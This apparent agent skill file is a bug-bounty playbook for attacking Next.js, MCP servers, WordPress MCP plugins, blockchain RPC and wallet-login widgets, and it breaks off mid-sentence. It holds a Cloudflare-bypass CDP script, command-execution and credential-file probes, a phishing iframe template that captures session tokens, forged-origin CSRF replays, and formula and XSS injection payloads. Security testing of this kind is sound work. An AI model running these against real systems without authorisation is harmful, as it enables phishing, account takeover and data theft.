---
name: modern-web-framework-attacks
description: "Next.js RSC, CDP bypass, JS bundles, MCP, feature flags, RPC"
metadata:
  hermes:
    tags: [security, bug-bounty, nextjs, cloudflare, web3, rsc, mcp, rpc]
version: 1.0.0
author: RESEARCHER_NAME
---

# Modern Web Framework Attack Playbooks

> Techniques discovered during arc.io audit (2026-09-20). Covers frameworks and patterns NOT covered by standard web attack playbooks.

---

## 1. Next.js React Server Component (RSC) Payload Extraction

Next.js App Router serves RSC flight data as inline `<script>self.__next_f.push(...)` blocks in the HTML. These contain **serialized application state** including config, SDK keys, API endpoints, and sometimes authentication details.

### Detection
```bash
curl -s "https://TARGET/page" | grep -oP 'self\.__next_f\.push\(\[1,"[^"]*"\]\)' | head -5
```

### What to Extract
```bash
# Config objects (feature flags, SDK keys, settings)
curl -s "https://TARGET/page" | grep -oP '"(socureSdkKey|stripeKey|apiKey|secret|token|auth)[^"]*":"[^"]*"'

# API endpoint patterns from RSC data
curl -s "https://TARGET/page" | grep -oP '/api/v[0-9]+/[^"\\]*' | sort -u

# Full initialConfig object
curl -s "https://TARGET/page" | grep -oP '"initialConfig":\{[^}]+\}'
```

### Impact
- SDK keys (client-side, but reveals integration details and provider config)
- Feature flags (internal toggle states, unreleased features)
- Payment provider config (Bvnk, Transak, Socure — KYC flow details)
- API endpoint schemas (request/response types from error messages)
- Token catalog with supported networks

### Severity: P4 (Low-Medium) — Information disclosure, not direct exploitation. Escalate if SDK key can bypass KYC flow controls or demo endpoint can be exploited.

### Pitfalls
- Socure SDK keys are CLIENT-SIDE public keys (like Stripe pk_test_...) — NOT secrets. Don't overclaim.
- The `bgcolor` parameter in onramp uses `dangerouslySetInnerHTML` BUT has strict regex validation (`^#[0-9a-fA-F]{3,8}$`) — XSS via this sink is blocked.
- `sessionToken` URL param IS reflected in RSC data 3 times — potential XSS sink if CSP allows.

---

## 2. Chrome CDP WebSocket — Cloudflare WAF Bypass

When curl is blocked by Cloudflare challenge, use Chrome DevTools Protocol via Python websocket to test endpoints from a browser context that has already passed the challenge.

### Setup (Windows)
```python
import subprocess, time, json, urllib.request, websocket

# Kill existing Chrome first
subprocess.run(["cmd.exe", "/c", "taskkill", "/F", "/IM", "chrome.exe", "/T"], capture_output=True)
time.sleep(2)

# Start Chrome with CDP
subprocess.Popen([
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    "--remote-debugging-port=9222",
    "--remote-allow-origins=*",
    "--user-data-dir=~/.local/share/Google/Chrome/User Data",
    "--no-first-run"
])
time.sleep(8)

# List pages
pages = json.loads(urllib.request.urlopen("http://localhost:9222/json").read())
```

### Navigate + Test from Browser Context
```python
ws = websocket.create_connection(pages[0]['webSocketDebuggerUrl'], timeout=15)

# Navigate to target
ws.send(json.dumps({"id": 1, "method": "Page.navigate", "params": {"url": "https://target.com/"}}))
ws.recv()
time.sleep(8)

# Test API endpoint with browser cookies/session
def evaluate(expr):
    cmd = {"id": 1, "method": "Runtime.evaluate",
           "params": {"expression": expr, "returnByValue": True, "awaitPromise": True}}
    ws.send(json.dumps(cmd))
    return json.loads(ws.recv()).get('result', {}).get('result', {}).get('value', '')

result = evaluate("""
    fetch('/api/v2/addresses/0x...', {headers: {'Accept': 'application/json'}})
        .then(r => r.status + ': ' + r.headers.get('content-type'))
""")
```

### Pitfalls
- `browser_exec` tool CANNOT access localhost (CDP) — use Python websocket directly
- Chrome must already have passed Cloudflare challenge (navigate to the site first, wait for Turnstile)
- Kill Chrome via `cmd.exe /c "taskkill /F /IM chrome.exe /T"` (bash taskkill fails on Windows)
- CDP URL format: `ws://localhost:9222/devtools/page/{TARGET_ID}`
- If CDP connection fails with "remote computer refused" — Chrome not started or port blocked

---

## 3. JavaScript Bundle API Endpoint Discovery

Search minified JS bundles for API route patterns. Reveals endpoints NOT linked in HTML or robots.txt.

### Method 1: Browser XHR (bypasses CORS, best for Cloudflare-protected sites)
```javascript
// Run via CDP evaluate
(() => {
    const scripts = performance.getEntriesByType('resource').filter(r => r.name.includes('_next'));
    return scripts.map(s => s.name).join('\n');
})()
```

### Method 2: curl + grep (for non-Cloudflare targets)
```bash
curl -s "https://TARGET/page" | \
  grep -oP 'src="(/_next/static/chunks/[^"]+\.js)"' | \
  sed 's/src="//;s/"//' | while read js; do
    curl -s "https://TARGET${js}" | grep -oP '"/api/v[0-9]+/[^"]*"' | sort -u
done
```

### What to Look For
- `/api/v1/...`, `/api/v2/...` — versioned API routes
- `fetch("...")` calls with URL templates
- Third-party SDK initialization URLs (Socure, Transak, Stripe)
- GraphQL endpoint URLs
- WebSocket URLs (`wss://`)
- Internal/undocumented endpoints (demo, test, admin)

---

## 4. MCP Server Command Execution Testing

Model Context Protocol (MCP) servers expose tools that may execute commands. Test for unauthenticated access and sandbox escape.

### Detection
```bash
curl -s "https://TARGET/.well-known/mcp/server-card.json"
curl -s "https://TARGET/mcp" -H "Accept: application/json, text/event-stream"
```

### Tool Enumeration
```bash
curl -s -X POST "https://TARGET/mcp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}'
```

### Command Execution Test
```bash
curl -s -X POST "https://TARGET/mcp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"TOOL_NAME","arguments":{"command":"env"}},"id":2}'
```

### Sandbox Escape Progression
```
1. env                    → environment variables (PATH, HOME, HOSTNAME)
2. ls /                   → filesystem structure
3. find / -maxdepth 3     → full file listing
4. cat /proc/self/environ → process environment (usually blocked)
5. cat /etc/passwd        → user accounts (usually blocked)
6. cat /home/user/.env    → config files (usually blocked)
```

### Pitfalls
- Check the auth gate BEFORE poking tools: modern deployments increasingly sit behind **Cloudflare Access
  OAuth** (`issuer <team>.cloudflareaccess.com`, `/mcp` → `401 invalid_token` + `resource_metadata`).
  Run the DCR / redirect_uri / PKCE / resource / forged-JWT checklist in
  `references/mcp-cloudflare-access-oauth.md` first — `tools/list` is unreachable until identity is solved.
- MCP sandbox often blocks `/proc`, `/etc`, `/home` — but `env` command usually works
- No curl/wget/nc/python in sandbox — can't exfiltrate data even with command execution
- The sandbox IS a finding (unauthenticated shell access) even without escape
- Severity: P3-P4 depending on sandbox restrictions

### 4b. MCP embedded in WordPress — the `/wp-json` route index is the discovery path

Verified 2026-10-12 (b2b.jochen-schweizer.de, a WP Engine / Elementor estate). An MCP server can be
installed as a **WordPress plugin**, and then it is discoverable from the REST index rather than from a
top-level `/mcp`:

```bash
curl -s "https://<host>/wp-json/" | python3 -c "
import json,sys; d=json.load(sys.stdin)
for p,ops in d.get('routes',{}).items():
    ms=[m.upper() for m in ops if m.lower() in ('get','post','put','patch','delete')]
    if ms: print(f\"{','.join(ms):20s} {p}\")"
```

Namespaces seen in the wild on one estate:

| namespace | route of interest | gate |
|---|---|---|
| `mcp` | `/wp-json/mcp/mcp-adapter-default-server` (methods `POST, GET, DELETE`) | `401 rest_forbidden` on a JSON-RPC `initialize` |
| `elementor-mcp-composer/v1.0.17` | `/…/mcp-settings` | `403 {"code":"invalid_nonce"}` |
| `elementor-mcp-composer/v1.0.17` | `/…/mcp-credentials` | `404` (route does not exist) |
| `elementor-ai/v1` | `/…/permissions` | `401 rest_forbidden` |

Three things this shape teaches:

1. **The route index is public by design; the handlers are the question.** Finding `mcp` in
   `/wp-json/namespaces` is not a finding — it is a lead. The finding, if any, is a handler that
   answers **before** its permission callback. Probe each one and read the status *and* the body.
2. **The WordPress MCP adapter gates on a nonce, not only on capability.** `invalid_nonce` means the
   REST nonce check ran first, so a bare JSON-RPC `initialize` can never reach `tools/list`. Expect
   `401 rest_forbidden` (permission callback) or `403 invalid_nonce` (nonce) and record BOTH as
   working controls, not as gaps.
3. **`initialize` is the cheapest single probe.** One POST with
   `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"probe","version":"0"}}}`
   tells you auth state in one request — far cheaper than walking a tool list you cannot reach.
   Report `401` as a verified control ("anonymous RPC refused at the permission layer, not merely at
   the edge").

**Path-prefix trap — this fabricates negatives.** The index lists `/mcp/mcp-adapter-default-server`;
the real URL is `https://<host>/wp-json/mcp/mcp-adapter-default-server`. Dropping the `/wp-json`
prefix returned a `404` **with a full HTML page** for four endpoints and read as "these routes do not
exist". Build every URL from the index's own `_links.self.href` field, never by re-concatenating the
path. Same trap applies to any framework whose REST index is a separate mount point.

**Budget the probes.** These estates sit behind Cloudflare and 429 fast (`Just a moment…`) — ~40
`wp-json` requests in one sitting tripped it. Cap the script (≤ 12 requests), space them 3–4 s, and
self-terminate on the first 429; see `bot-protected-target-testing` §3a-1 for the operator's
"stop and stay stopped" rule.

**When the MCP surface is closed, say so and name the only unlock.** Tools/list and tool-abuse testing
require a valid session — so the honest close is "anonymous MCP RPC refused (`401`), tool-inventory
testing needs an authenticated account", and the hand-off asks for that account rather than grinding
against the gate.

---

## 5. Feature Flag & Config Endpoint Enumeration

Many Next.js/React apps expose feature flag endpoints without authentication.

### Common Paths
```
/api/feature-flags
/api/config
/api/settings
/api/me
/api/pw/me
/api/log/info
```

### What They Leak
- Feature toggle states (enabled/disabled features, unreleased functionality)
- Token/blockchain routing configurations (which chains/tokens are supported)
- Third-party SDK IDs and settings (DynamoAuth SDK ID, Socure key)
- Backend version info (Blockscout v11.3.1)
- Internal API surface (endpoints, schemas, auth requirements)

### PoC
```bash
curl -s "https://TARGET/api/feature-flags" | python3 -m json.tool
curl -s "https://TARGET/api/config" | python3 -m json.tool
curl -s "https://TARGET/api/pw/me"  # {"signedIn":false} = no auth required
```

---

## 6. Blockchain RPC Endpoint Fingerprinting

For targets with blockchain components, test the RPC endpoints for information disclosure.

### Node Software Fingerprinting
```bash
curl -s -X POST "https://RPC/" -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":1}'
# → reth/v2.2.0, geth/v1.x.x, etc.
```

### CORS Analysis
```bash
curl -sI "https://RPC/" -H "Origin: https://evil.com" | grep -i "access-control"
# Access-Control-Allow-Origin: * = any website can make cross-origin RPC calls
# Access-Control-Allow-Headers: * = any headers accepted
```

### Method Filtering Enumeration
```bash
# "Request method filtered" = method exists but blocked
# "Method not found" = method doesn't exist on this node
for method in personal_listAccounts admin_nodeInfo debug_traceTransaction txpool_content trace_block; do
  result=$(curl -s -X POST "https://RPC/" -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"${method}\",\"params\":[],\"id\":1}")
  echo "$method: $result"
done
```

### Data Exposure
```bash
# Get full block data (transactions, miner, state root)
curl -s -X POST "https://RPC/" -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0xBLOCKNUM", true],"id":1}'

# Get token transfer logs
curl -s -X POST "https://RPC/" -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getLogs","params":[{"fromBlock":"0xSTART","toBlock":"0xEND","topics":["0xddf252ad..."]}],"id":1}'
```

### Pitfalls
- RPC is public blockchain infra — data exposure is BY DESIGN
- Focus on: inconsistent filtering (reveals implementation), CORS wildcard (enables browser-based attacks), node version disclosure
- Different RPC providers (Blockdaemon, dRPC, QuickNode) may have different filtering — test ALL

---

## 7. DynamoAuth / SIWE Phishing — Hosted Widget Embed

Many Web3 apps use Dynamic.xyz (DynamoAuth) for wallet authentication. The SDK exposes a **hosted widget URL** that can be embedded in any iframe — enabling phishing with the legitimate auth flow.

### Discovery
```bash
# Find SDK ID from target's JS bundles
curl -s "https://TARGET/" | grep -oP 'f[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'

# Verify hosted widget URL works (HTTP 200 = exploitable)
curl -sI "https://app.dynamic.xyz/widget/{SDK_ID}"
```

### Attack Chain
1. **Hosted widget** at `https://app.dynamic.xyz/widget/{SDK_ID}` — returns full auth modal (identical to target)
2. **Embed in iframe** on attacker-controlled page
3. **Victim connects wallet** → widget generates nonce INTERNALLY (via SDK flow, not API)
4. **Victim signs SIWE** → widget submits to `/verify` endpoint
5. **Widget sends session token** via `postMessage` to parent frame
6. **Attacker captures session token** from postMessage listener

### Phishing Page Template
```html
<iframe src="https://app.dynamic.xyz/widget/{SDK_ID}" 
        style="width:420px;height:500px;border:none;border-radius:24px;"></iframe>
<script>
window.addEventListener('message', (event) => {
    if (event.origin.includes('dynamic')) {
        // Capture session token, wallet address, signature
        console.log('Dynamic event:', event.data);
    }
});
</script>
```

### Why It Works
- Widget is the **same code** used by the real portal (SDK ID matches)
- Nonce is generated by SDK internally → valid for `/verify`
- SIWE message is formatted by SDK → correct EIP-4361 format
- Victim sees legitimate "Welcome to Arc" UI → no suspicion
- Hosted on `app.dynamic.xyz` → trusted domain

### DynamoAuth API Endpoints
```bash
# Nonce generation (no auth)
GET https://app.dynamicauth.com/api/v0/sdk/{SDK_ID}/nonces?count=1
# → {"nonces":["abc123..."]}

# Verify endpoint (accepts signed SIWE)
POST https://app.dynamicauth.com/api/v0/sdk/{SDK_ID}/verify
# Required fields (from 400 error schema):
#   signedMessage: ECDSA signature
#   publicWalletAddress: wallet address
#   chain: "EVM" | "SOL" | etc
#   walletName: "MetaMask" | "Coinbase" | etc
#   walletProvider: "browserExtension" | "walletConnect" | "qrCode" | etc
#   messageToSign: SIWE message string
#   nonce: from /nonces endpoint

# Session check (requires auth cookie)
GET https://app.dynamicauth.com/api/v0/sdk/{SDK_ID}/session
```

### SIWE Message Format (EIP-4361)
```
{ADDRESS} wants you to sign in with your Ethereum account:
{ADDRESS}

Sign in to {APP_NAME}

URI: https://{DOMAIN}
Version: 1
Chain ID: {CHAIN_ID}
Nonce: {NONCE}
Issued At: {TIMESTAMP}
```

### Node.js Signing (when Python eth_account fails)
```javascript
const {ethers} = require('ethers');
const wallet = new ethers.Wallet(PRIVATE_KEY);
const signature = await wallet.signMessage(siweMessage);
const recovered = ethers.verifyMessage(siweMessage, signature);
// recovered === wallet.address
```
**Pitfall:** Python `eth-account` library may fail on Python 3.14 due to `eth_utils.CamelModel` import error. Use Node.js `ethers` instead.

### Severity
- **P3-P4 (Medium-Low)** — Requires victim interaction (social engineering)
- Escalate to **P2** if: session token can be used for direct asset transfer, no MFA required

### Pitfalls
- DynamoAuth `/verify` has Cloudflare rate limiting (error 1015) — wait 5-10 min between attempts
- Nonces are stateless random tokens (different each request) — NOT session-bound
- `/verify` validates nonce server-side → nonce from API may fail if not generated through SDK flow
- Test with YOUR OWN wallet first, then explain how victim's wallet completes the chain
- `sessionToken` reflected in onramp RSC payload is different from DynamoAuth session — don't confuse

---

## Cross-References
- Cross-origin **framing + postMessage control channels** (embedded checkout/widget surfaces, the
  "headers-from-a-429-page" trap, attacker-origin iframe harness, OOPIF attach) →
  `references/framing-and-postmessage-audit.md`
- **MCP servers behind Cloudflare Access OAuth** (DCR scope, redirect_uri / PKCE / resource / forged-JWT
  checks, identity isolation, honest closure of stale leads) → `references/mcp-cloudflare-access-oauth.md`
- **MCP embedded in a WordPress plugin** (`mcp` / `elementor-mcp-composer` / `elementor-ai` namespaces in
  the `/wp-json` index, the `initialize` one-request gate probe, `invalid_nonce` vs `rest_forbidden`, and
  the `/wp-json` path-prefix trap that fabricates 404s) → this file, §4b
- Standard web attacks → `security-web-attacks` skill
- Two-account identity bootstrap for the cross-tenant matrix below → `disposable-auth-identity` skill
- RPC fingerprinting details → `references/rpc-fingerprint.md` in security-web-attacks
- Cloudflare bypass alternatives → `automation/camoufox` or `automation/browser-session-daemon` skills
- Next.js specific → `references/nextjs-nextdata-disclosure.md` in bug-bounty skill
- **Plotly Dash dashboards** (internal analytics/trading UIs) → `references/plotly-dash-callback-attacks.md`.
  `/_dash-dependencies` and `/_dash-layout` are unauthenticated by default and the callback graph names
  the login gate; `POST /_dash-update-component` invokes callbacks, and on some deployments it 401s until
  you send `Referer` + `Origin`. Includes the exact request shape, the "partial output string returns an
  empty 200" trap, and the anonymous-password-oracle + throttle-measurement recipe.
- Arc.io audit lessons (findings, what worked, what didn't) → `references/arc-io-audit-lessons.md`
- QuarterWise VDP audit case study (hardened target, verified-negatives, reload-oracle,
  TOTP self-enrollment, role-confound false-positive) → `references/quarterwise-verified-negatives-case-study.md`

---

## 8. Next.js App Router Server-Action Replay (BOLA / IDOR / CSRF)

App Router (Next 13.4+) forms submit to the **current page URL** as a `next-action` POST,
NOT to a REST endpoint. To test authorization/CSRF on a state-changing action you must
replay that exact wire format. A plain `curl -d "field=value"` with only the visible
fields returns 404/malformed — you need the hidden `$ACTION_*` fields and headers.

### 8a. Capture the exact wire format from the browser (most reliable)
Hook `fetch` via CDP `Runtime.evaluate` and serialize a `FormData` body to
`URLSearchParams` so you see the real field names and the `next-action` id:
```js
// Run in the authenticated tab before clicking the submit button:
(function(){ window.__cap=[]; const of=window.fetch;
  window.fetch=function(u,init){ return of.apply(this,arguments).then(async r=>{
    let b=(init&&init.body); let s='';
    if(b instanceof FormData){ s=new URLSearchParams([...b.entries()]).toString(); }
    else if(typeof b==='string'){ s=b; }
    window.__cap.push({u:String(u),m:init?init.method:'',ct:(init?.headers?.['Content-Type'])||'',
      headers:init?.headers||{}, body:s.slice(0,2000)});
    return r; }); }; return 'HOOK'; })()
// click the button, then read window.__cap
```
**Key facts captured this way:**
- URL = the page URL itself (e.g. `/app/sources/<uuid>`), method POST.
- Headers: `Accept: text/x-component`, `next-action: <64-hex actionId>`,
  `next-router-state-tree: <urlencoded JSON tree>`, `Content-Type: application/x-www-form-urlencoded`.
- Body fields are prefixed with an action-index, e.g. `_1_$ACTION_KEY`, `_1_<id>`,
  `_1_propertyId`, `_1_percent`, plus a trailing `0=` result-marker field. **The field
  prefix changes per action index — read it from the capture, don't assume.**

### 8b. Replay with curl (cross-tenant / CSRF test)
```bash
curl -sk -X POST "https://TARGET/app/sources/<A_UUID>" \
  -H "Accept: text/x-component" \
  -H "next-action: <actionId>" \
  -H "next-router-state-tree: <captured tree>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "A0=<json>&_1_\$ACTION_1:0=<json>&_1_\$ACTION_KEY=<key>&_1_propertyId=<OTHER_UUID>&_1_percent=10" \
  -b victim_jar.txt            # replace propertyId with a foreign object id for the BOLA test
```
- **BOLA/IDOR:** replay with account B's jar but account A's object id. `404 not found` =
  proper authz (data-layer check, NOT just routing). `200` mutating A's data = BOLA.
- **CSRF:** add `-H "Origin: https://evil.example" -H "Referer: https://evil.example/"` and
  re-test. If it still succeeds, the action is not origin-checked.

### 8c. The `$ACTION_KEY` is a per-render anti-CSRF token
`$ACTION_KEY` (value `k<hash>`) is rendered fresh into each page and **rotates per page
render**. A key from a stale page render is rejected — which is ALSO why a key you scrape
from HTML can 404 when replayed minutes later. Grab the key from the **same page render**
you're replaying against, or capture the live submit and replay it within seconds.
This token is a second layer of CSRF defense ON TOP of SameSite=Lax + HttpOnly cookies.

### 8d. AuthZ is enforced at the data layer, not the router
The decisive cross-tenant signal: a foreign object id returns a clean `404 {"error":"not
found"}` (or `307 /login` when anonymous) even when the route itself is reachable. Test
the **matrix**: `{A,B,anon} × {GET page, API export, server-action POST, import preview}`
and confirm B never sees A's data. A `404` on B's request for A's resource is PROOF of
enforcement, not a bug — document it as "authz verified", with the A→A `200` control row.

### 8e. XLSX / CSV export-import formula-injection check
For any app that imports CSV/XLSX and exports XLSX, test **stored formula injection**:
- Create an entry (or import a row) whose free-text field = `=HYPERLINK("https://evil/x","c")`
  or `cmd|'/C notepad'!A0` or `=DDE...`.
- Export to XLSX, unzip, and inspect:
  - `xl/sharedStrings.xml` for the literal text (safe if stored as `&lt;`/`&quot;`-escaped text).
  - `xl/worksheets/sheet1.xml` for `<f>` formula cells or `t="str"` live-formula cells
    (the actual exploit). If the `=`-prefixed value is a `<f>` cell → malicious macros/links
    run when the victim opens the file.
- Most frameworks store it as escaped shared-string text → inert. Confirm, don't assume.

### 8f. OG Image Endpoint Pattern — Informational Disclosure + XSS Theoretical Check
Many apps expose `/api/og/{token}/{title}` endpoints that generate Open Graph images from user input. Attack surface analysis:

**Discovery:** Look for base64-encoded titles in page source or HTML links:
```bash
# Search for og image URLs
grep -roP 'api/og/[a-f0-9]+/[A-Za-z0-9+/=]+' page.html | sort -u

# Or find base64 strings in title attributes
curl -s "https://TARGET/page" | grep -oP 'title="[^"]*"' | grep -oP '[A-Za-z0-9+/=]{20,}' | xargs -I{} echo "Test: https://TARGET/api/og/placeholder/{}" | curl -L -s -w "%{http_code}\n" | head -5
```

**Attack Chain (Theoretical):**
1. Attacker generates hostile payload: `<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>`
2. Base64 encodes: `btoa(payload)` → `PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==`
3. Submits to `/api/og/{token}/base64payload`
4. Server generates PNG image with embedded hostile content

**Reality Check:**
- Token is usually **server-generated, unpredictable hash** (not derivable from title)
- Attacker cannot generate valid tokens without discovery mechanism
- Even with valid token: PNG renders rasterized binary blob, NOT SVG/DOM execution
- **SVG-in-PNG does NOT equal XSS** because PNG parser strips all non-raster data

**Testing Pattern:**
```bash
# Test unknown token → always 404
curl -s "https://TARGET/api/og/deadbeefcafe/PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" -w "%{http_code}\n"

# Test known token with hostile payload → usually 404 or sanitizes payload
curl -s "https://TARGET/api/og/knowntoken/PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" -w "%{http_code}\n"
```

**Assessment:**
- If endpoint requires unknown token → **Informational only** (endpoint structure revealed)
- If token is predictable/client-side generated → Medium severity (XSS via PNG metadata)
- If hostile payload executed in DOM → High (but extremely rare for PNG)

**Lesson from production audit:** QuarterWise returns 404 for unknown tokens. SVG vectors inside PNG files do not execute in modern browsers. Severity: LOW/INFORMATIONAL.

**Reference:** Full deep-dive analysis saved as `references/og-endpoint-analysis.md`.

## Pitfalls (8)
- A bare `curl -d` with only the visible form fields → 404/malformed. The `$ACTION_*`
  fields + `next-action` header are mandatory; capture them, don't guess.
- The `_1_` field prefix and the trailing `0=` marker are per-action-index; read from capture.
- Stale `$ACTION_KEY` (from an old page render) is rejected — capture fresh.
- `X-XSRF`/cookie-CSRF may be doubly defended (SameSite=Lax + per-render key) → test the
  origin-spoof, and treat success as the finding, not the header absence.

## 9. Server-Action State Changes: Reload-Oracle, MFA Unlock, Role-Confound

Techniques from the QuarterWise VDP audit (2026-09-26). Verifies **server-side**
enforcement vs client-side-only UI gates, and unlocks MFA-gated flows with your own account.

### 9a. Reload-oracle: prove server-side enforcement (not UI hiding)
When a UI gate looks solid (field disabled, button absent, error toast), do NOT conclude
"safe" from the UI. The decisive test is state persistence across a **fresh reload** (or an
export/API source of truth):

```
1. Submit the state-changing action with a WRONG/incomplete credential (e.g. wrong TOTP).
2. Hard-reload the page (Page.navigate, not reload if SPA keeps in-memory state).
3. Check whether the value persisted in the field / rendered state.
   - empty + an error message after reload  -> server rejected  = enforcement real
   - value pre-populated after reload       -> check was client-side only = VULN
4. Cross-check with an independent source of truth (e.g. /api/account/export JSON) because
   DOM-input value after submit may just be the optimistic UI value, not server state.
```
Lesson: a "wrong code → NINO not saved + empty after reload" result proved MFA was enforced
server-side; a manual `urllib` multipart POST that returned 500 for BOTH valid and invalid
codes was a BROKEN replay, not a server signal — always run the controlled baseline
(valid credential) before interpreting the failure case.

### 9b. Hand-built multipart server-action replay — exact-wire requirement
Next.js server actions that use `multipart/form-data` (file uploads, forms with
`encType=multipart/form-data`) FAIL with generic 500 when you hand-assemble the body:
- Field names need the action-index prefix (`_3_$ACTION_REF_3`, `_3_nino`, ...) and a
  trailing `0=[{},"$K1"]` marker field.
- Missing `next-router-state-tree` / exact `next-action` header → 500 HTML (not a JSON
  error), indistinguishable from an authz rejection.
- Do not interpret that 500 as either "blocked" or "vulnerable". Capture the EXACT wire
  via `Network.getRequestPostData` on the live submit (`Network.requestWillBeSent` gives
  only a truncated `postData`), then replay that byte-for-byte. If you still get 500 on a
  legit replay, fall back to browser-DOM testing (fill + click through CDP) — it is the
  ground truth and avoids the fragile manual-multipart path.

### 9c. Evil-origin replay ≠ CSRF unless the same body succeeds legitimately
Replaying a captured server-action body with `Origin: https://evil.example` + same
session cookie → 500 with a digest error is standard Next.js origin checking. Confirm the
CONTROL: the identical body with correct Origin returns 2xx. Then verify via source of
truth that the action did NOT fire twice (e.g. transaction count unchanged). A single
successful legit action + failed evil-origin replay = CSRF safe. (Same pattern as §8b.)

### 9d. TOTP/MFA self-enrollment to unlock MFA-gated features (own account)
Apps gate high-value flows (HMRC connect, adviser role changes, NINO save) behind
"2FA required". You can enroll your OWN account programmatically:
1. Start the authenticator-app enrollment; the page reveals a Base32 TOTP secret
   (`[A-Z2-7]{20,}`) — read it from the DOM.
2. Generate an RFC 6238 code in Python:
   `base64.b32decode(secret + '='*((8-len(secret)%8)%8))` → HMAC-SHA1(counter) → last 4
   bytes & 0x7FFFFFFF mod 10^6, zero-padded to 6.
3. Submit the code → MFA on. **Pitfall:** the secret ROTATES on every page reload, and
   submitting an old secret's code fails; read the secret and generate the code in the
   SAME page render without navigating.
4. Afterwards the TOTP secret stays valid for login/verification prompts — reuse it to
   pass MFA-required actions (role upgrade, NINO save, email/password change) in later tests.

### 9e. Role-confound disambiguation (cross-role boundary tests)
When a test account holds MULTIPLE grants (e.g. adviser `contributor` AND co-owner 50%),
a successful delete/edit does NOT prove the role under test is the problem — the OTHER
grant may authorize it. A candidate "contributor deleted owner's entry" finding was a
FALSE POSITIVE until the owner removed the co-owner share; as a pure contributor the
delete button disappeared entirely.
- To prove a role-boundary violation, **isolate the role under test**: remove other grants
  first, re-test, and confirm the control still holds.
- Strong server-side signal on Next.js apps: per-row action buttons are CONDITIONALLY
  rendered by the server. `[aria-label="Delete entry"]` existing only on rows the current
  principal may delete (owner entries → 0 buttons for pure contributor; own entries → 1)
  is direct evidence of correct object-level authorization — document it as verified.
- Note: co-owner/share grants DO legitimately include full write on shared books "by
  design" in many apps — read the product language before treating shared-write as a bug.

### 9f. Next.js RSC-flight reflection — escaped ≠ XSS
Param markers (e.g. `/reset?why=cpmark987abc`) that appear in raw HTML are almost always
inside the `self.__next_f.push` flight JSON: `"c":["","reset?why=cpmark987abc\u0026..."]`.
`\u003c`-escaped payloads are NOT executable. To rule out DOM XSS properly:
- marker in **visible text**: yes/no
- marker in a **sink attribute** (`href`/`src`/`action`): yes/no
- raw HTML context: is it inside a quoted JSON string (escaped) or an unquoted attr/node?
Only an unescaped sink is a finding. Grep-for-marker in raw HTML alone generates false
positives (the string is always present in flight data).

### 9g. Import-path injection (CSV/XLSX upload → preview → commit → export)
A CSV uploaded to an import flow with `=SUM(...)`, `<img onerror>`, `@@cmd`, `{{7*7}}`,
`${7*7}` in a free-text column:
- Preview renders them as plain text (safe), BUT the commit is the real boundary.
- Complete the import (confirm → choose property → commit), then check ALL outputs:
  entries page (escaped text? executed img?), property XLSX export
  (`xl/sharedStrings.xml` literal vs `<f>` formula), clients CSV (`'=` prefix added?).
- Free-plan import gating and multi-step wizards (`Apply mapping` → `Continue to preview`
  → `Import just this property`) mean the UI is multi-step; capture the final commit POST
  and verify by export JSON, not by trusting the wizard's visible state.

### 9h. OTP/MFA lockout verification — account-level vs per-session (decisive matrix)
When testing OTP brute-force resistance, the question that matters is whether the
attempt counter resets on a FRESH login/session:
- Round 1: login → wrong OTPs until blocked (or N attempts, bounded).
- Round 2: fresh login → wrong OTPs again.
  - Round 2 immediately blocked → **account-level lockout** = safe (session rotation does
    NOT bypass). Document the round-1 block-at count.
  - Round 2 gets fresh attempts → per-session counter only = attacker can rotate logins to
    reset the budget = brute-forceable = HIGH finding.
- Apply the SAME two-round test to MFA-recovery flows (Forget-MFA → email code → confirm).
  A "Too many attempts. Request a new code." that PERSISTS after fresh navigation/submit is
  account-level enforcement.
- Bounded numbers that proved safe on a real target: login wrong-password blocked at
  attempt 11 ("wait about 15 minutes"), login-MFA wrong OTP blocked at 6, MFA-recovery
  wrong code blocked at 6, all persisting across fresh sessions. Record these as verified
  negatives with the block-at counts — they ARE the evidence the control works.
- Solid recovery-flow markers: "takes 24 hours", "we'll email you first so you can stop it",
  "remind you before it is removed", per-recovery cooldown ~58s. These make
  recovery-based MFA disable non-attackable even with the password.
- **URL params that echo into message text are display-only — verify enforcement separately.**
  `/reset?codeLimit=1&why=cooldown` changed the on-page text to "ask for a new code in
  about 1 seconds" while the actual resend cooldown stayed server-side 58s. A param
  reflected into UI copy is NOT a rate-limit control. Proof: check an independent signal
  (resend button cooldown, submit rejection) that the server did not honor the value.
- MFA-recovery code in the email SUBJECT line ("Confirm turning off two-factor — code
  764264") is a minor hygiene note, not a finding (the email goes to the account holder);
  mention it only in hardening notes.

### 9i. Duplicate-submission race on server actions — same-tick vs real double-click
Next.js server-action writes (e.g. "Add income" ledger entry) can be submitted twice from
ONE form instance if two `.click()` calls land in the same JS tick via
`Runtime.evaluate`:
```
b.click(); b.click();   // same Runtime.evaluate tick -> 2 ledger entries (verified in export)
```
- A REAL user double-click (150 ms apart) produced exactly 1 entry — the form closes after
  the first submit, so normal interaction does NOT trigger it. Exploitability requires a
  scripted/automated same-tick trigger or network replay → severity LOW/informational
  (missing idempotency on writes), not a payout-grade bug. Do not overclaim.
- **Verify by export JSON, not page text.** The rendered page shows the amount twice even
  for one entry (£55.55 label + entry line). Count from the account/property export JSON
  (`amountPence` occurrences) — that is the source of truth.
- Contrast with the same product's API (idempotent on `externalRef`): UI-path server action
  with NO idempotency key / unique constraint is the root cause. Report as
